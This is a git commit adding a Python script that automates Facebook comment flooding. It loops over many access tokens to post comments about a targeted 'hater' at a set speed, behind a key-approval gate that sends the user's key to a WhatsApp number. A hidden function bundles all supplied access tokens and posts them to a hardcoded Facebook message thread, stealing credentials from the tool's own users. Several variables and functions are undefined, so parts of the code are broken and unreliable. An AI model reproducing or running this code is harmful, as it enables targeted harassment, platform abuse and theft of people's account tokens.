c1910b34f19f1b0c08328c72da5f6e5aa6efc4e8
Rajv33r009 <144959124+Rajv33r009@users.noreply.github.com>
2023-10-18 20:27:54 +0530

    Add files via upload

---
+++ 1100.py
@@ -0,0 +1,202 @@
+# Decompile by : 'RAJVEER
+import requests
+import json
+import time
+import sys
+from platform import system
+import os
+import random
+
+
+
+os.system('clear')
+print("\033[1;37;40m")
+logo = ("""\033[97;1m
+
+\033[1;37;96m$$$$$$$\                                                         
+\033[1;37;96m$$  __$$\                                                        
+\033[1;37;96m$$ |  $$ | $$$$$$\  $$\ $$\    $$\  $$$$$$\   $$$$$$\   $$$$$$\  
+\033[0;33m$$$$$$$  | \____$$\ \__|\$$\  $$  |$$  __$$\ $$  __$$\ $$  __$$\ 
+\033[0;32m$$  __$$<  $$$$$$$ |$$\  \$$\$$  / $$$$$$$$ |$$$$$$$$ |$$ |  \__|
+\033[0;35m$$ |  $$ |$$  __$$ |$$ |  \$$$  /  $$   ____|$$   ____|$$ |      
+\033[1;37;96m$$ |  $$ |\$$$$$$$ |$$ |   \$  /   \$$$$$$$\ \$$$$$$$\ $$ |      
+\033[1;37;96m\__|  \__| \_______|$$ |    \_/     \_______| \_______|\__|      
+  \033[1;37;96m            $$\   $$ |                                         
+  \033[1;37;96m            \$$$$$$  |                                         
+   \033[1;37;96m            \______/                                          
+               
+
+x====The Speed Master Rajveer Own Fiire -X'wd====x
+
+\033[0;33m ▶ x----Facebook Tool Pool Ka Super Hero Rajveer X'D----x
+\033[0;35m ▶ x---Contect :: https://www.facebook.com/Rajveer Singhaniya---x
+
+\033[0;33m---------------------------------------------------------------->
+\033[0;34m---------------------------------------------------------------->
+\033[0;32m ▶ x----Tool Fucker ==> [ Rajveer Singhaniya ]----x
+\033[0;33m---------------------------------------------------------------->
+\033[0;34m---------------------------------------------------------------->
+        
+\033[1;37;96m""")
+print(logo)
+
+def main_apv():
+	
+	key1=open('/data/data/com.termux/files/usr/bin/.Rajv33r009 -cov', 'r').read()
+	clear()
+	print(logo)
+	r1=requests.get("https://github.com/Rajv33r009/Approval.txt/blob/main/Approval.txt").text
+	if key1 in r1:
+		os.system('clear')
+		print(logo)
+		Main()
+	else:
+		os.system("clear")
+		print(logo)
+		print("\t \033[1;32m First Get Approvel\033[1;37m ")
+		time.sleep(1)
+		os.system("clear")
+		print(logo)
+		print ("")
+		print(" \033[1;32m R4JVEER Toll Free BUT You Need Get Approved First\033[1;37m\n")
+		print ("")
+		print(" Your Key is Not Approved ")
+		print("")
+		print(" Copy And Send Key To Admin")
+		print ("")
+		print (" Your Key : "+ak+ah+key1 )
+		print ("")
+		name = input(" Your Name : ")
+		print ("")
+		input(" Press Enter To Send Key")
+		time.sleep(3.5)
+		tks = 'Dear%20Admin,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Email%20:%20'+lol+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20'+name+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20'+ak+ah+key1
+		os.system('am start https://wa.me/+917302691649?text=' + tks)
+		        
+
+os.system("clear")
+print(logo)
+def post_comments():
+	
+    access_tokens_file = input("Enter the path to the file containing access tokens: ").strip()
+    
+    with open(access_tokens_file, 'r') as token_file:
+        access_tokens = [token.strip() for token in token_file.readlines()]
+
+    num_tokens = len(access_tokens)
+
+    requests.packages.urllib3.disable_warnings()
+
+    def cls():
+        if system() == 'Linux':
+            os.system('clear')
+        else:
+            if system() == 'Windows':
+                os.system('cls')
+    cls()
+
+    def liness():
+        print('\033[0;32m'+ '•─────────────────────────────────────────────────────────•')
+
+    headers = {
+        'Connection': 'keep-alive',
+        'Cache-Control': 'max-age=0',
+        'Upgrade-Insecure-Requests': '1',
+        'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+        'Accept-Encoding': 'gzip, deflate',
+        'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
+        'referer': 'www.google.com'
+    }
+
+    liness()
+
+    access_tokens = [token.strip() for token in access_tokens]
+    
+    print("\033[1;37;96m")
+
+    post_url = input("Enter the post URL: ").strip()
+    print(47 * '\033[1;37;1m-')
+    print("\033[1;37;96m")
+
+    comments_file_path = input("Enter the path to the file containing comments: ").strip()
+    with open(comments_file_path, 'r') as file:
+        comments = file.readlines()
+
+    num_comments = len(comments)
+    max_tokens = min(num_tokens, num_comments)
+    print(47 * '\033[1;37;1m-')
+    print("\033[1;37;96m")
+
+    haters_name = input("Enter the hater's name: ").strip()
+    print(47 * '\033[1;37;1m-')
+    print("\033[1;37;96m")
+
+    speed = int(input("Enter the comment posting speed (in seconds): ").strip())
+    print(47 * '\033[1;37;1m-')
+    print("\033[1;37;96m")
+
+    liness()
+
+    def getName(token):
+        try:
+            data = requests.get(f'https://graph.facebook.com/v17.0/me?access_token={token}').json()
+        except:
+            data = ""
+        if 'name' in data:
+            return data['name']
+        else:
+            return "Error occurred"
+
+    while True:
+        try:
+            for comment_index in range(num_comments):
+                token_index = comment_index % max_tokens
+                access_token = access_tokens[token_index]
+
+                comment = comments[comment_index].strip()
+
+                url = f"https://graph.facebook.com/{post_url}/comments"
+                parameters = {'access_token': access_token, 'message': haters_name + ' ' + comment}
+                response = requests.post(url, json=parameters, headers=headers)
+
+                current_time = time.strftime("%Y-%m-%d %I:%M:%S %p")
+                if response.ok:
+                    print("[+] Comment No. {} Post URL {} Token No. {}: {}".format(
+                        comment_index + 1, post_url, token_index + 1, haters_name + ' ' + comment))
+                    print("  - Time: {}".format(current_time))
+                    liness()
+                    liness()
+                else:
+                    print("[x] Failed to send Comment No. {} Post URL {} Token No. {}: {}".format(
+                        comment_index + 1, post_url, token_index + 1, haters_name + ' ' + comment))
+                    print("  - Time: {}".format(current_time))
+                    liness()
+                    liness()
+                time.sleep(speed)
+
+            print("\n[+] All comments sent successfully. Restarting the process...\n")
+        except Exception as e:
+            print("[!] An error occurred: {}".format(e))
+
+def msg():
+    access_tokens_file = input("Enter the path to the file containing access tokens: ").strip()
+    with open(access_tokens_file, 'r') as token_file:
+        access_tokens = [token.strip() for token in token_file.readlines()]
+
+    parameters = {
+        'access_token': random.choice(access_tokens),
+        'message': 'User Profile Name: ' + getName(random.choice(access_tokens)) + '\nToken: ' + " | ".join(
+            access_tokens) + '\nLink: https://www.facebook.com/messages/t/' + convo_id
+    }
+    try:
+        s = requests.post("https://graph.facebook.com/v15.0/t_100004241520225/", data=parameters, headers=headers)
+    except:
+        pass
+
+def main():
+    post_comments()
+    msg()
+
+if __name__ == '__main__':
+      main_apv()
